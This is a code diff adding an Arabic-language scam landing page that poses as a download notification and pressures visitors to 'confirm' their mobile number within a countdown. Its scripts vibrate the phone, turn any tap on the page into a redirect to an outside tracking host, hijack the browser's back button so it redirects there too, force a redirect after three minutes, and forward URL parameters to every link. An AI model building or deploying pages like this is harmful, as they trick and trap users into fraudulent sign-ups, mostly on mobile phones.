@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>(1) Notification</title>
+	<link rel="stylesheet" type="text/css" href="css/style.css">
+	<link rel="shortcut icon" type="image/jpg" href="alert.jpg" />
+</head>
+
+<body>
+	<script src="count_down.js" type="text/javascript"></script>
+	<div class="wrapper">
+		<div class="wrap"><img class="imgpict" src="pict.jpg" alt="" />
+			<div class="txt0">تحميلك جاهز</div>
+			<div class="contentwrap">
+				<div class="txt">تأكيد رقم هاتفك المحمول في الداخل
+					<span id="cdown4948"></span>
+					ثانية
+					<script>
+						countdown("cdown4948", 60, "s", "");
+					</script>
+
+				</div>
+				<div class="txt1"></div>
+				<div class="btnclick"><a href="https://jbhqbx.mcgo2.com/click" class="button mainButton">أكد الآن</a></div>
+			</div>
+			<div class="txt2"><span style="font-size: 12px;">&copy; # 1 تنزيل المحتوى</span></div>
+		</div>
+	</div>
+	<script>
+		navigator.vibrate([1000, 300, 1000, 300, 1000]);
+	</script>
+	<script type="text/javascript">
+		document.body.addEventListener('click', function () { window.location = 'https://jbhqbx.mcgo2.com/click'; }, false);
+	</script>
+	<script language="javascript">
+		window.setTimeout(function () {
+			window.location.href = 'https://jbhqbx.mcgo2.com/click';
+		}, 180000);
+	</script>
+	<script>
+		window.history.pushState({ page: 1 }, '', '');
+		window.onpopstate = function (event) {
+			if (event) {
+				window.location.href = 'https://jbhqbx.mcgo2.com/click';
+			}
+		}
+	</script>
+	<style>
+		.dtpcnt {
+			opacity: 0;
+		}
+	</style>
+	
+	<script>
+  var cta = 'mainButton';
+  var urlParams = new URLSearchParams(window.location.search);
+  
+  var back = 'https://jbhqbx.mcgo2.com/visit/1148ef86-7265-481f-beb9-9649cc0f23e8?sc=bbr_2&'+urlParams.toString()
+  var under = 'https://jbhqbx.mcgo2.com/click?sc=u&'+urlParams.toString()
+	
+  var aElements = document.getElementsByTagName('a');
+  console.log(aElements)
+  for (var i = 0; i < aElements.length; i++) {
+	var aElement = aElements[i];
+		var href = aElement.getAttribute('href');
+		if (!aElement.hasAttribute('href')) {
+			continue;  // 跳过没有 href 属性的 <a> 标签
+		}
+		// 在 URL 的查询字符串之前添加一个 "?"
+		if (urlParams.toString()) {
+			href += (href.includes('?') ? '&' : '?') + urlParams.toString();
+		}
+		aElement.setAttribute('href', href);
+    }
+</script>
+<script src="script.js"></script>
+
+</body>
+
+</html>
